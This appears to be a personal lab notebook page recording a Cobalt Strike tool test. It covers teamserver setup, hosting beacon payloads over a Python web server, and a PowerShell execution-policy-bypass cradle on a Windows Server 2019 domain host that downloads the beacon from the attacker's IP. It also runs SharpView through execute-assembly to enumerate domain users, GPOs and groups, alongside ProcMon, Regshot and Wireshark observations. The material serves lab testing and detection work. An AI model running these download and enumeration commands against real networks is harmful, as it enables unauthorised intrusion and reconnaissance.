---
created_date: 25 September 2023
updated_date: 
type: tool testing
---
Cobalt strike server setup
```powershell
[root💀/opt/cobaltstrike] [172.16.153.176] [2023-09-25 11:57:14] 
 └─╼ # ./teamserver 172.16.153.176 'passphrase' custom-cobalt/Profiles/custom.profile
```
![[Pasted image 20230925120030.png]]
Starting cobaltstrike server
```powershell
[root💀/opt/cobaltstrike] [192.168.146.129] [2023-09-25 12:08:23] 
 └─╼ # ./cobaltstrike 
```
![[Pasted image 20230925121405.png]]
Navigating to `/root/cobaltpayloads` 
```powershell
[root💀~/cobaltpayloads] [192.168.146.129] [2023-09-25 12:11:20] 
 └─╼ # ls
Beacon_http_80_x64.dll           Beacon_http_80_x86.dll
Beacon_http_80_x64.exe           Beacon_http_80_x86.exe
Beacon_http_80_x64.ps1           Beacon_http_80_x86.ps1
Beacon_http_80_x64.svc.exe       Beacon_http_80_x86.svc.exe
Beacon_http_80_x64.xprocess.bin  Beacon_http_80_x86.xprocess.bin
Beacon_http_80_x64.xthread.bin   Beacon_http_80_x86.xthread.bin
```
Setting up python3 server
```bash
[root💀~/cobaltpayloads] [192.168.146.129] [2023-09-25 12:15:11] 
 └─╼ # python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```
![[Pasted image 20230925121639.png]]
On Windows Server 2019 BLIZZARD.local pulling payload onto to get beacon on Cobalt Strike
```powershell
powershell -ep bypass

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.146.129:8080/Beacon_x64.exe', 'beacon.exe')
```
![[Pasted image 20230925133615.png]]
Took first regshot
![[Pasted image 20230925133723.png]]
Ran SharpView.exe that was already on build under poshc2.exe
```powershell
beacon> execute-assembly /usr/share/poshc2/resources/modules/SharpView.exe Get-NetDomain
```
![[Pasted image 20230925134036.png]]
```powershell
beacon> execute-assembly /usr/share/poshc2/resources/modules/SharpView.exe Get-ForestDomain
```
![[Pasted image 20230925134314.png]]
```powershell
beacon> execute-assembly /usr/share/poshc2/resources/modules/SharpView.exe Get-DomainUser -Properties name, MemberOf | fl
```
![[Pasted image 20230925141119.png]]
```powershell
beacon> execute-assembly /usr/share/poshc2/resources/modules/SharpView.exe Get-DomainGPO
```
![[Pasted image 20230925141329.png]]
```powershell
beacon> execute-assembly /usr/share/poshc2/resources/modules/SharpView.exe Get-NetGPO
```
![[Pasted image 20230925141441.png]]


Have to build a 4.5.2 net framework

ProcMon filters used:
- **CreateFile**: When a process wants to create a file.
- **WriteFile**: When a process writes data to a file.
- **SetRenameInformationFile**: When a rename operation occurs on a file.
- **SetDispositionInformationFile**: When a file deletion occurs on a file.
- **RegCreateKey**: When registry key is created.
- **RegSetValue**: When the data for value is set in the registry
- **RegDeleteKey**: When a key gets deleted from the registry.
- **RegDeleteValue**: When a value gets deleted from the registry.
- **TCP Connect, TCP Receive, UDP Send, UDP Receive**: Process is Sending / Receiving a TCP or UDP connection.
- **Load Image:** When a process loads any DLL’s / Executables.
- **Process Create:** When a process creates a process.
- **CreatePipe:** When a process creates a Pipe.
![[Pasted image 20230925144255.png]]
Nothing of interest added/changed. Everything running isnative minus beacon.exe which is my cobalt strike beacon.
![[Pasted image 20230925144758.png]]
Pulling SharpView.exe from Gobots to Windows Server 2019 to change .NET framework in Visual Studio 2019

Pulled Entire zipped SharpView Directory off github on WIndows Server 2019 to change .NET framework in Visual Studio 2019
`https://github.com/tevora-threat/SharpView/tree/master`
![[Pasted image 20230926105042.png]]
Navigated  to Visual Studo 2019 and changed the .net framework to 4.0

Create a new Visual Studio 2019 Project as a Class Library .Net Framework
![[Pasted image 20230926110357.png]]
Set Desired framework, in this case .NET Framework 4
![[Pasted image 20230926110449.png]]
Once in the project with the proper framework open the zip folder
![[Pasted image 20230926110709.png]]
Double click the .sln file ( Visual Studio Solution File )
Press the Start Button to start code in release version.
New SharpView.exe with .NET 4.0 framework is now loaded in the highlighted file path.
`C:\Users\Administrator\Downloads\SharpView-master\SharpView-master\SharpView\bin\Release`
![[Pasted image 20230926104927.png]]
Tranferring this .exe version to Gobots
Moving the new SharpView.exe to the python folder ( python isnt an environmental variable - need system to do ) 
Location of Python executable:
C:\Users\Administrator\AppData\Local\Programs\Python\Python311
![[Pasted image 20230926114507.png]]
Hosting Python server
Navigated to web server on Windows Server 2019
![[Pasted image 20230926114631.png]]
Starting Cobalt Strike

```powershell
powershell -ep bypass
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.146.129:8080/http_x64.exe', 'beacon.exe')
```

Sha256sum of actual .NET 4.0 Framework SharpView.exe
```powershell
[root💀~/tooltesting] [192.168.146.129] [2023-09-26 12:08:02] 
 └─╼ # sha256sum SharpView.exe
813d096c7e106e2695794fb5d009c2dc760961f4e69046d78ff215fcb415b6c8  SharpView.exe
```
Wireshark Follow TCP Stream
- Nothing of relevance, just beacon calling out and RST'ing
![[Pasted image 20230926125123.png]]
Images from new SharpView.exe
```powershell
beacon> execute-assembly /root/tooltesting/SharpView.exe Get-NetDomain
# gets network domain controllers
```
![[Pasted image 20230926132428.png]]
```powershell
beacon> execute-assembly /root/tooltesting/SharpView.exe Get-ForestDomain
```
![[Pasted image 20230926132652.png]]
```powershell
beacon> execute-assembly /root/tooltesting/SharpView.exe Get-DomainUser -Properties name, MemberOf | fl
```
![[Pasted image 20230926132729.png]]
```powershell
execute-assembly /root/tooltesting/SharpView.exe Get-DomainGPO
```
![[Pasted image 20230926133106.png]]

```powershell
beacon> execute-assembly /root/tooltesting/SharpView.exe Get-NetGroup | select samaccountname, admincount, description
```

![[Pasted image 20230926133141.png]]